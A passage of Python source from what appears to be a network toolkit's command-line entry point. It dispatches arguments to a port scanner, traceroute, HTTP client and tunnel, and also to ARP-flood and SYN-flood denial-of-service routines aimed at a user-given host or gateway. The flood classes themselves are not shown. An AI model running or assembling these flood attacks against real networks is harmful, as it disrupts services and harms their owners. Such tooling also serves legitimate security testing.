                    print(" ".join([str(i) for i in sorted(scan.opens)]))
                if len(scan.unspecified) :
                    print(f"\nunspecified ports({len(scan.unspecified)}) :\n\t", end = str())
                    print(" ".join([str(i) for i in sorted(scan.unspecified)]))
                else : print("no open ports!")
                return

        asyncio.run(prepare())
        return

    def Trace_args(args : argparse.Namespace) -> None :
        args.msg = "Trace"
        if not Constant.ISROOT : root_access_error()
        trigger(args)
        trace = Trace(
            socket.gethostbyname(args.host),
            args.efforts,
            args.timeout,
            args.max_error
            )
        trace.trace()
        return

    def DoS_Arp_args(args : argparse.Namespace) -> None :
        args.msg = "DoS_Arp"
        if not Constant.ISROOT : root_access_error()
        trigger(args)
        flood = DoS_Arp(
            args.iface,
            args.source,
            args.gateway,
            args.src_mac,
            args.number,
            args.wait
            )
        flood.flood()
        return

    def DoS_SYN_args(args : argparse.Namespace) -> None :
        args.msg = "DoS_SYN"
        if not Constant.ISROOT : root_access_error()
        trigger(args)
        flood = DoS_SYN(
            socket.gethostbyname(args.host),
            args.port,
            args.number,
            args.random_port
            )
        flood.flood()
        return

    def HTTP_Request_args(args : argparse.Namespace) -> None :
        args.msg = "HTTP"
        trigger(args)
        client = HTTP_Request(
            args.host,
            args.port,
            args.method,
            args.custom,
            args.endpoint,
            args.secure
            )
        client.request()
        return

    def Tunnel_args(args : argparse.Namespace) -> None :
        args.msg = "Tunnel"
        if (not Constant.ISROOT) and (args.port <= 1024) : root_access_error()
        trigger(args)
        tunnel = Tunnel(
            args.host,
            args.port,
            args.timeout,
            args.buffer
            )
        tunnel.tunnel()
        return

    def invalid_args(arg : str) -> None :
        msg = "[" + Constant.RED("ERROR") + "]" + " "
        msg += Constant.RED(f"Invalid argument : \"{arg}\"") + "\n"
        msg += "[" + Constant.RED("ERROR") + "]" + " "
        msg += Constant.RED("Type : \"python hi6toolkit.py [--help | -h]\"")
        print(msg, file = sys.stderr)
        Constant.EXIT(1)
        return

    def root_access_error() -> None :
        msg = "[" + Constant.RED("ERROR") + "]" + " "
        msg += Constant.RED("ROOT ACCESS ERROR") + "\n"
        print(msg)
        Constant.EXIT(1)
        return

    def trigger(msg : str) -> None :
        if not Constant.MODULE :
            info_args(msg)
            input("\nPress ENTER to continue...\n")
        return

    def main() -> bool :
        print(Constant.ESCAPE + "c")
        signal.signal(signal.SIGINT, Constant.SIGNAL)
        signal.signal(signal.SIGTERM, Constant.SIGNAL)
        if not Constant.ISOS :
            print(Constant.RED("unsupported OS"))
            Constant.EXIT(1)
        args = manage_args()
        if ("func" in vars(args)) :
            args.func(args)
        else :
            invalid_args("argument NOT found")
        return True

    main()
